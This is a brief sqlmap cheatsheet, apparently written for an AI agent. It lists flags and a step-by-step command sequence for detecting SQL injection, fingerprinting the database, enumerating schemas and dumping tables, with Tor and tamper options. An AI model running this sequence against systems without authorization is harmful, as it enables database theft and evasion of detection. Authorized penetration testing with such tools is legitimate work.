# sqlmap Cheatsheet

## Common Goal -> Flags

- Detect SQLi quickly: `--batch --level=1 --risk=1`
- Increase coverage: `--level=3 --risk=2 --technique=BEUSTQ`
- Fingerprint backend: `-f --banner --current-user --current-db`
- Enumerate schema: `--dbs --tables --columns`
- Dump data: `-D <db> -T <table> --dump`
- Filter targets/params: `-p <param> --skip=<param> --param-filter=POST`
- Replay raw request: `-r <request-file>`
- Add auth/session context: `--cookie=... --auth-type=... --auth-cred=...`
- Use proxy/Tor: `--proxy=...` or `--tor --check-tor`
- Persist/review logs: `-t traffic.txt --har traffic.har --output-dir=<dir>`

## Practical Ramps

Use `<sqlmap_cmd>` as a placeholder. If user does not provide it, set `<sqlmap_cmd>=sqlmap`.

1. Start:
`<sqlmap_cmd> -u "<url>" --batch --level=1 --risk=1`
1. Confirm and fingerprint:
`<sqlmap_cmd> -u "<url>" --batch -f --banner --current-db`
1. Enumerate scope:
`<sqlmap_cmd> -u "<url>" --batch --dbs`
1. Extract specific table:
`<sqlmap_cmd> -u "<url>" --batch -D "<db>" -T "<table>" --columns --dump`

## Notes

- Keep `--threads` low first; increase only if target stability allows.
- Add `--delay`, `--timeout`, `--retries` for unstable networks.
- Use `--tamper` only when bypass is required and scope is authorized.
